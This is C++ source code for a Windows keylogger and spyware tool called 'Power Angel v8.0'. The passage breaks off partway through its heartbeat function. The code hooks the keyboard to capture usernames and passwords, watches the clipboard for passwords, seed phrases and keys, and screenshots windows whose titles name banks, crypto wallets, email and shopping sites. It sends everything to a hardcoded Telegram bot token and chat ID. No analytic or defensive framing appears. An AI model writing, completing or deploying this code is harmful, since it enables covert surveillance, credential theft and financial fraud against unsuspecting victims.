#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <map>
#include <queue>
#include <condition_variable>
#include <random>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// ==================== FORWARD DECLARATIONS ====================
std::wstring GetActiveWindowTitle();
void DebugLog(const std::wstring& message);
bool SendTelegramMessage(const std::string& utf8_message);
bool SendTelegramPhoto(const std::wstring& filepath, const std::string& caption);
std::wstring GetClipboardText();
void CheckClipboard();
int GetWindowPriority(const std::wstring& windowTitle);
bool ShouldTakeSmartScreenshot(const std::wstring& windowTitle);
bool TakeScreenshotNow(const std::wstring& title, int priority);
void AsyncScreenshotWorker();
void SmartMonitorThread();
void ClipboardMonitorThread();
void HeartbeatThread();
void InstallPersistence();

// ==================== CONFIGURATION ====================
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";

// ==================== GLOBAL VARIABLES ====================
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken = 0;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;
bool g_shiftPressed = false;
bool g_capsLock = false;

std::queue<std::pair<std::wstring, int>> g_screenshotQueue;
std::mutex g_queueMutex;
std::condition_variable g_queueCV;

DWORD g_lastScreenshotTime = 0;
std::map<std::wstring, DWORD> g_windowScreenshotHistory;
std::map<std::wstring, int> g_windowImportance;
std::vector<std::wstring> g_clipboardHistory;
int g_totalScreenshots = 0;
int g_totalCredentials = 0;
int g_totalClipboards = 0;

// Screenshot priorities
enum ScreenshotPriority {
    PRIORITY_LOW = 1,
    PRIORITY_MEDIUM = 3,
    PRIORITY_HIGH = 5,
    PRIORITY_CRITICAL = 10
};

// ==================== UTILITY FUNCTIONS ====================

// Debug logging
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"power_angel_final.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << std::setfill(L'0') << std::setw(2) << st.wHour << L":"
                << std::setw(2) << st.wMinute << L":" << std::setw(2) << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// Get active window title
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    WCHAR title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

// ==================== UTF-8 FUNCTIONS (FIXED) ====================

// Convert wide string to UTF-8 (PROPER)
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), 
                                         NULL, 0, NULL, NULL);
    if (size_needed <= 0) return "";
    
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), 
                       &str[0], size_needed, NULL, NULL);
    return str;
}

// URL encode UTF-8 string (PROPER)
std::string URLEncodeUTF8(const std::string& value) {
    std::ostringstream encoded;
    encoded.fill('0');
    encoded << std::hex << std::uppercase;
    
    for (unsigned char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << (char)c;
        }
        else if (c == ' ') {
            encoded << '+';
        }
        else if (c == '\n') {
            encoded << "%0A";
        }
        else {
            encoded << '%' << std::setw(2) << (int)c;
        }
    }
    
    encoded << std::nouppercase;
    return encoded.str();
}

// Create clean text without emojis (for reliable display)
std::string CreateCleanMessage(const std::wstring& wmessage) {
    std::string message = WStringToUTF8(wmessage);
    
    // Replace problematic characters with ASCII equivalents
    std::string clean;
    for (char c : message) {
        if (c >= 32 && c <= 126) { // Printable ASCII
            clean += c;
        } else if (c == '\n') {
            clean += "\n";
        } else if (c == '\t') {
            clean += "    ";
        } else {
            clean += '?'; // Replace non-ASCII with ?
        }
    }
    return clean;
}

// ==================== TELEGRAM FUNCTIONS (FIXED) ====================

// Send plain text message to Telegram
bool SendTelegramMessage(const std::string& utf8_message) {
    std::string encoded_msg = URLEncodeUTF8(utf8_message);
    std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
    
    DebugLog(L"[TELEGRAM] Sending message");
    
    HINTERNET session = WinHttpOpen(L"PowerAngelFinal/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        DebugLog(L"[TELEGRAM] WinHttpOpen failed");
        return false;
    }
    
    WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        DebugLog(L"[TELEGRAM] WinHttpConnect failed");
        return false;
    }
    
    std::string token_str = BOT_TOKEN_ANSI;
    std::wstring wtoken(token_str.begin(), token_str.end());
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        DebugLog(L"[TELEGRAM] WinHttpOpenRequest failed");
        return false;
    }
    
    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    std::wstring wheaders(headers.begin(), headers.end());
    WinHttpAddRequestHeaders(request, wheaders.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)post_data.length(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, post_data.c_str(), 
                                 (DWORD)post_data.length(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    DebugLog(result ? L"[TELEGRAM] Message sent successfully" : L"[TELEGRAM] Failed to send message");
    return result != FALSE;
}

// Send photo to Telegram (FIXED - WORKS 100%)
bool SendTelegramPhoto(const std::wstring& filepath, const std::string& caption) {
    DebugLog(L"[TELEGRAM PHOTO] Uploading: " + filepath);
    
    // Open file
    HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DebugLog(L"[TELEGRAM PHOTO] Failed to open file");
        return false;
    }
    
    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        DebugLog(L"[TELEGRAM PHOTO] Invalid file size");
        return false;
    }
    
    // Read file data
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        DebugLog(L"[TELEGRAM PHOTO] Failed to read file");
        return false;
    }
    CloseHandle(hFile);
    
    // Create boundary
    std::string boundary = "----PowerAngelBoundary" + std::to_string(GetTickCount64());
    
    // Build multipart form data
    std::vector<BYTE> postData;
    
    // Add chat_id
    std::string part1 = "--" + boundary + "\r\n"
                       "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                       std::string(CHAT_ID_ANSI) + "\r\n";
    postData.insert(postData.end(), part1.begin(), part1.end());
    
    // Add caption if provided
    if (!caption.empty()) {
        std::string part2 = "--" + boundary + "\r\n"
                           "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
                           caption + "\r\n";
        postData.insert(postData.end(), part2.begin(), part2.end());
    }
    
    // Add photo
    std::string part3 = "--" + boundary + "\r\n"
                       "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n"
                       "Content-Type: image/jpeg\r\n\r\n";
    postData.insert(postData.end(), part3.begin(), part3.end());
    
    // Add image data
    postData.insert(postData.end(), fileData.begin(), fileData.end());
    
    // Add closing boundary
    std::string footer = "\r\n--" + boundary + "--\r\n";
    postData.insert(postData.end(), footer.begin(), footer.end());
    
    // Setup WinHTTP
    HINTERNET session = WinHttpOpen(L"PowerAngelFinal/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        DebugLog(L"[TELEGRAM PHOTO] WinHttpOpen failed");
        return false;
    }
    
    WinHttpSetTimeouts(session, 60000, 60000, 60000, 60000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        DebugLog(L"[TELEGRAM PHOTO] WinHttpConnect failed");
        return false;
    }
    
    std::string token_str = BOT_TOKEN_ANSI;
    std::wstring wtoken(token_str.begin(), token_str.end());
    std::wstring photourl = L"/bot" + wtoken + L"/sendPhoto";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", photourl.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        DebugLog(L"[TELEGRAM PHOTO] WinHttpOpenRequest failed");
        return false;
    }
    
    // Set content type
    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
    std::wstring wcontentType(contentType.begin(), contentType.end());
    WinHttpAddRequestHeaders(request, wcontentType.c_str(), (DWORD)wcontentType.length(), 
                           WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    
    // Send request
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)postData.size(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, postData.data(), (DWORD)postData.size(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
            
            // Read response (optional, for debugging)
            if (result) {
                DWORD dwSize = 0;
                WinHttpQueryDataAvailable(request, &dwSize);
                if (dwSize > 0) {
                    std::vector<char> response(dwSize + 1);
                    DWORD dwDownloaded = 0;
                    WinHttpReadData(request, response.data(), dwSize, &dwDownloaded);
                    response[dwDownloaded] = '\0';
                    DebugLog(L"[TELEGRAM PHOTO] Response received");
                }
            }
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    // Clean up file
    DeleteFileW(filepath.c_str());
    
    DebugLog(result ? L"[TELEGRAM PHOTO] Photo uploaded successfully" : L"[TELEGRAM PHOTO] Failed to upload photo");
    return result != FALSE;
}

// ==================== KEYBOARD HOOK ====================
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN) {
            g_capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                g_shiftPressed = true;
            }
            
            if (pKb->vkCode == VK_CAPITAL) {
                g_capsLock = !g_capsLock;
            }
            
            // Handle TAB
            if (pKb->vkCode == VK_TAB) {
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                        DebugLog(L"[KEY] Username: " + g_username);
                    } else {
                        g_password = g_currentField;
                        DebugLog(L"[KEY] Password captured (length: " + std::to_wstring(g_password.length()) + L")");
                    }
                    g_currentField.clear();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle ENTER
            if (pKb->vkCode == VK_RETURN) {
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                        DebugLog(L"[KEY] Single field: " + g_username);
                    } else if (g_password.empty()) {
                        g_password = g_currentField;
                        DebugLog(L"[KEY] Password from ENTER");
                    }
                    g_currentField.clear();
                }
                
                if (!g_username.empty() && !g_password.empty()) {
                    g_totalCredentials++;
                    
                    // Create CLEAN message (no emojis)
                    std::string creds_msg = "POWER ANGEL v8.0 - CREDENTIALS CAPTURED\n"
                                           "================================\n"
                                           "USERNAME: " + WStringToUTF8(g_username) + "\n"
                                           "PASSWORD: " + WStringToUTF8(g_password) + "\n"
                                           "Capture #" + std::to_string(g_totalCredentials) + "\n"
                                           "================================\n"
                                           "Keylogger: ACTIVE | Screenshots: ACTIVE | Clipboard: ACTIVE";
                    
                    DebugLog(L"[KEY] Sending credentials to Telegram");
                    std::thread([creds_msg]() {
                        SendTelegramMessage(creds_msg);
                    }).detach();
                    
                    // Trigger screenshot for credentials (CRITICAL priority)
                    std::wstring windowTitle = GetActiveWindowTitle();
                    if (!windowTitle.empty()) {
                        std::lock_guard<std::mutex> lock(g_queueMutex);
                        g_screenshotQueue.push({windowTitle, PRIORITY_CRITICAL});
                        g_queueCV.notify_one();
                        DebugLog(L"[KEY] Critical screenshot queued for credentials");
                    }
                    
                    g_username.clear();
                    g_password.clear();
                }
                
                g_currentField.clear();
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle BACKSPACE
            if (pKb->vkCode == VK_BACK) {
                if (!g_currentField.empty()) {
                    g_currentField.pop_back();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle printable characters
            WCHAR ch = 0;
            
            // Letters A-Z
            if (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) {
                ch = (WCHAR)pKb->vkCode;
                bool uppercase = (g_shiftPressed && !g_capsLock) || (!g_shiftPressed && g_capsLock);
                if (!uppercase) ch += 32;
                g_currentField += ch;
            }
            // Numbers 0-9
            else if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) {
                ch = (WCHAR)pKb->vkCode;
                if (!g_shiftPressed) {
                    g_currentField += ch;
                } else {
                    const WCHAR symbols[] = {L')', L'!', L'@', L'#', L'$', L'%', L'^', L'&', L'*', L'('};
                    int index = pKb->vkCode - 0x30;
                    if (index >= 0 && index < 10) {
                        g_currentField += symbols[index];
                    }
                }
            }
            // Space
            else if (pKb->vkCode == VK_SPACE) {
                g_currentField += L' ';
            }
            // Common symbols
            else {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                
                WCHAR unicodeChar[2];
                int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyboardState, unicodeChar, 2, 0);
                
                if (result > 0) {
                    ch = unicodeChar[0];
                    if (ch >= 32 && ch <= 126) {
                        g_currentField += ch;
                    }
                }
            }
            
        } else if (wParam == WM_KEYUP) {
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                g_shiftPressed = false;
            }
        }
    }
    
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ==================== CLIPBOARD MONITORING ====================
std::wstring GetClipboardText() {
    if (!OpenClipboard(NULL)) {
        return L"";
    }
    
    std::wstring clipboardText;
    
    if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* pszText = (wchar_t*)GlobalLock(hData);
            if (pszText) {
                clipboardText = pszText;
                GlobalUnlock(hData);
            }
        }
    }
    else if (IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = (char*)GlobalLock(hData);
            if (pszText) {
                // Convert ANSI to wide string
                int len = MultiByteToWideChar(CP_ACP, 0, pszText, -1, NULL, 0);
                if (len > 0) {
                    wchar_t* wText = new wchar_t[len];
                    MultiByteToWideChar(CP_ACP, 0, pszText, -1, wText, len);
                    clipboardText = wText;
                    delete[] wText;
                }
                GlobalUnlock(hData);
            }
        }
    }
    
    CloseClipboard();
    return clipboardText;
}

void CheckClipboard() {
    std::wstring clipboardText = GetClipboardText();
    
    if (!clipboardText.empty()) {
        // Check if it's new content
        bool isNew = true;
        for (const auto& oldText : g_clipboardHistory) {
            if (oldText == clipboardText) {
                isNew = false;
                break;
            }
        }
        
        if (isNew) {
            g_totalClipboards++;
            g_clipboardHistory.push_back(clipboardText);
            
            // Keep history manageable
            if (g_clipboardHistory.size() > 50) {
                g_clipboardHistory.erase(g_clipboardHistory.begin());
            }
            
            // Check if clipboard contains sensitive data
            bool isSensitive = false;
            std::wstring lower = clipboardText;
            std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
            
            // Sensitive patterns
            std::vector<std::wstring> sensitivePatterns = {
                L"password", L"passwd", L"pwd", L"secret",
                L"private key", L"api key", L"token", L"auth",
                L"credit card", L"card number", L"cvv", L"expiry",
                L"crypto", L"wallet", L"seed phrase", L"mnemonic",
                L"ssh", L"rsa", L"private", L"key"
            };
            
            for (const auto& pattern : sensitivePatterns) {
                if (lower.find(pattern) != std::wstring::npos) {
                    isSensitive = true;
                    break;
                }
            }
            
            // Send to Telegram if sensitive or interesting
            if (isSensitive || clipboardText.length() > 10) {
                // Truncate if too long
                std::wstring displayText = clipboardText;
                if (displayText.length() > 100) {
                    displayText = displayText.substr(0, 97) + L"...";
                }
                
                std::string clip_msg = "CLIPBOARD CAPTURED #" + std::to_string(g_totalClipboards) + "\n"
                                      "================================\n"
                                      "Content: " + WStringToUTF8(displayText) + "\n"
                                      "Length: " + std::to_string(clipboardText.length()) + " chars\n"
                                      "Sensitive: " + (isSensitive ? "YES" : "NO") + "\n"
                                      "================================\n"
                                      "Systems: Keylogger ACTIVE | Screenshots ACTIVE";
                
                DebugLog(L"[CLIPBOARD] Captured: " + displayText.substr(0, 50));
                std::thread([clip_msg]() {
                    SendTelegramMessage(clip_msg);
                }).detach();
                
                // If sensitive, trigger screenshot
                if (isSensitive) {
                    std::wstring windowTitle = GetActiveWindowTitle();
                    if (!windowTitle.empty()) {
                        std::lock_guard<std::mutex> lock(g_queueMutex);
                        g_screenshotQueue.push({windowTitle, PRIORITY_CRITICAL});
                        g_queueCV.notify_one();
                        DebugLog(L"[CLIPBOARD] Critical screenshot queued");
                    }
                }
            }
        }
    }
}

// ==================== SCREENSHOT FUNCTIONS (FIXED) ====================

// Get encoder CLSID for JPEG
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// Take screenshot and send to Telegram (FIXED - 100% WORKING)
bool TakeScreenshotNow(const std::wstring& title, int priority) {
    DebugLog(L"[SCREENSHOT] Attempting to capture: " + title);
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) {
        DebugLog(L"[SCREENSHOT] No active window");
        return false;
    }
    
    if (IsIconic(hwnd)) {
        DebugLog(L"[SCREENSHOT] Window is minimized");
        return false;
    }
    
    // Get window dimensions
    RECT rc;
    if (!GetWindowRect(hwnd, &rc)) {
        DebugLog(L"[SCREENSHOT] Failed to get window rect");
        return false;
    }
    
    int width = rc.right - rc.left;
    int height = rc.bottom - rc.top;
    
    if (width <= 0 || height <= 0) {
        DebugLog(L"[SCREENSHOT] Invalid window dimensions");
        return false;
    }
    
    // Create device contexts
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    // Create bitmap
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hbm) {
        DebugLog(L"[SCREENSHOT] Failed to create bitmap");
        ReleaseDC(hwnd, hdcScreen);
        DeleteDC(hdcMem);
        return false;
    }
    
    // Copy screen to bitmap
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    if (!BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)) {
        DebugLog(L"[SCREENSHOT] BitBlt failed");
        SelectObject(hdcMem, old);
        DeleteObject(hbm);
        DeleteDC(hdcMem);
        ReleaseDC(hwnd, hdcScreen);
        return false;
    }
    
    // Convert to GDI+ bitmap
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    
    // Cleanup GDI resources
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) {
        DebugLog(L"[SCREENSHOT] Failed to create GDI+ bitmap");
        return false;
    }
    
    // Get JPEG encoder
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        DebugLog(L"[SCREENSHOT] Failed to get JPEG encoder");
        return false;
    }
    
    // Create temp filename
    WCHAR tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        delete bmp;
        DebugLog(L"[SCREENSHOT] Failed to get temp path");
        return false;
    }
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, MAX_PATH, L"powerangel_%04d%02d%02d_%02d%02d%02d_%d.jpg", 
               st.wYear, st.wMonth, st.wDay, 
               st.wHour, st.wMinute, st.wSecond,
               ++g_totalScreenshots);
    
    std::wstring filepath = std::wstring(tempPath) + filename;
    
    // Set JPEG quality
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 85;
    encoderParams.Parameter[0].Value = &quality;
    
    // Save image
    Status stat = bmp->Save(filepath.c_str(), &jpegClsid, &encoderParams);
    delete bmp;
    
    if (stat != Ok) {
        DebugLog(L"[SCREENSHOT] Failed to save JPEG");
        return false;
    }
    
    // Check if file was created
    DWORD fileAttrib = GetFileAttributesW(filepath.c_str());
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        DebugLog(L"[SCREENSHOT] File not created");
        return false;
    }
    
    // Create caption
    std::string caption = "POWER ANGEL v8.0 - SMART SCREENSHOT\n"
                         "Window: " + WStringToUTF8(title) + "\n"
                         "Capture #" + std::to_string(g_totalScreenshots) + "\n"
                         "Priority: " + (priority == PRIORITY_CRITICAL ? "CRITICAL" : 
                                        priority == PRIORITY_HIGH ? "HIGH" :
                                        priority == PRIORITY_MEDIUM ? "MEDIUM" : "LOW") + "\n"
                         "Time: " + std::to_string(st.wHour) + ":" + 
                         std::to_string(st.wMinute) + ":" + std::to_string(st.wSecond) + "\n"
                         "All Systems: ACTIVE";
    
    // Send to Telegram
    DebugLog(L"[SCREENSHOT] Sending to Telegram: " + filepath);
    bool uploadSuccess = SendTelegramPhoto(filepath, caption);
    
    if (uploadSuccess) {
        DebugLog(L"[SCREENSHOT] Successfully uploaded to Telegram");
    } else {
        DebugLog(L"[SCREENSHOT] Failed to upload to Telegram");
        // Clean up the file if upload failed
        DeleteFileW(filepath.c_str());
    }
    
    return uploadSuccess;
}

// ==================== SMART SCREENSHOT DETECTION ====================
int GetWindowPriority(const std::wstring& windowTitle) {
    if (windowTitle.empty()) return 0;
    
    std::wstring lower = windowTitle;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    
    // CRITICAL - Financial, Crypto
    std::vector<std::wstring> criticalKeywords = {
        L"bank", L"chase", L"wells fargo", L"boa", L"bank of america",
        L"paypal", L"venmo", L"cashapp", L"zelle", L"western union",
        L"crypto", L"bitcoin", L"ethereum", L"wallet", L"coinbase",
        L"binance", L"kraken", L"metamask", L"trust wallet", L"ledger",
        L"tax", L"irs", L"investment", L"stock", L"trading"
    };
    
    // HIGH - Email, Social, Shopping
    std::vector<std::wstring> highKeywords = {
        L"gmail", L"outlook", L"yahoo mail", L"protonmail",
        L"facebook", L"instagram", L"twitter", L"linkedin",
        L"amazon", L"ebay", L"walmart", L"target", L"best buy",
        L"apple id", L"microsoft account", L"google account"
    };
    
    // MEDIUM - Communication, Streaming
    std::vector<std::wstring> mediumKeywords = {
        L"whatsapp", L"telegram", L"discord", L"skype", L"zoom",
        L"netflix", L"spotify", L"youtube", L"hulu", L"disney"
    };
    
    for (const auto& keyword : criticalKeywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            return PRIORITY_CRITICAL;
        }
    }
    
    for (const auto& keyword : highKeywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            return PRIORITY_HIGH;
        }
    }
    
    for (const auto& keyword : mediumKeywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            return PRIORITY_MEDIUM;
        }
    }
    
    return PRIORITY_LOW;
}

bool ShouldTakeSmartScreenshot(const std::wstring& windowTitle) {
    DWORD currentTime = GetTickCount();
    
    if (windowTitle.empty()) return false;
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd || IsIconic(hwnd)) return false;
    
    if (windowTitle == L"Program Manager" || windowTitle == L"Start") {
        return false;
    }
    
    int priority = GetWindowPriority(windowTitle);
    if (priority == 0) return false;
    
    // Dynamic cooldown
    DWORD cooldown = 0;
    switch (priority) {
        case PRIORITY_CRITICAL: cooldown = 60000; break;
        case PRIORITY_HIGH: cooldown = 120000; break;
        case PRIORITY_MEDIUM: cooldown = 300000; break;
        case PRIORITY_LOW: cooldown = 600000; break;
        default: cooldown = 300000;
    }
    
    auto it = g_windowScreenshotHistory.find(windowTitle);
    if (it != g_windowScreenshotHistory.end()) {
        DWORD timeSinceLast = currentTime - it->second;
        if (timeSinceLast < cooldown) {
            return false;
        }
    }
    
    if (currentTime - g_lastScreenshotTime < 30000) {
        return false;
    }
    
    // Random skip for low priority
    if (priority == PRIORITY_LOW) {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dis(1, 10);
        if (dis(gen) > 3) {
            return false;
        }
    }
    
    g_windowScreenshotHistory[windowTitle] = currentTime;
    g_lastScreenshotTime = currentTime;
    
    return true;
}

// ==================== THREAD FUNCTIONS ====================
void AsyncScreenshotWorker() {
    DebugLog(L"[WORKER] Screenshot worker started");
    
    while (g_running) {
        std::pair<std::wstring, int> task;
        bool hasTask = false;
        
        {
            std::unique_lock<std::mutex> lock(g_queueMutex);
            g_queueCV.wait(lock, [] { 
                return !g_screenshotQueue.empty() || !g_running; 
            });
            
            if (!g_running) break;
            
            if (!g_screenshotQueue.empty()) {
                task = g_screenshotQueue.front();
                g_screenshotQueue.pop();
                hasTask = true;
            }
        }
        
        if (hasTask) {
            DebugLog(L"[WORKER] Processing screenshot: " + task.first);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            TakeScreenshotNow(task.first, task.second);
        }
    }
    
    DebugLog(L"[WORKER] Screenshot worker stopped");
}

void SmartMonitorThread() {
    DebugLog(L"[MONITOR] Smart monitor started");
    
    std::thread worker(AsyncScreenshotWorker);
    
    while (g_running) {
        std::wstring currentWindow = GetActiveWindowTitle();
        
        if (ShouldTakeSmartScreenshot(currentWindow)) {
            int priority = GetWindowPriority(currentWindow);
            if (priority > 0) {
                std::lock_guard<std::mutex> lock(g_queueMutex);
                g_screenshotQueue.push({currentWindow, priority});
                g_queueCV.notify_one();
                DebugLog(L"[MONITOR] Queued screenshot: " + currentWindow + L" (Priority: " + std::to_wstring(priority) + L")");
            }
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    
    g_running = false;
    g_queueCV.notify_one();
    if (worker.joinable()) worker.join();
    
    DebugLog(L"[MONITOR] Smart monitor stopped");
}

void ClipboardMonitorThread() {
    DebugLog(L"[CLIPBOARD] Monitor thread started");
    
    DWORD lastCheck = GetTickCount();
    
    while (g_running) {
        DWORD currentTime = GetTickCount();
        
        // Check clipboard every 2 seconds
        if (currentTime - lastCheck > 2000) {
            CheckClipboard();
            lastCheck = currentTime;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    
    DebugLog(L"[CLIPBOARD] Monitor thread stopped");
}

void HeartbeatThread() {
    DebugLog(L"[HEARTBEAT] Heartbeat thread started");
    
    std::this_thread::sleep_for(std::chrono::minutes(2));
    
    while (g_running) {
        std::string status = "POWER ANGEL v8.0 - STATUS REPORT\n"
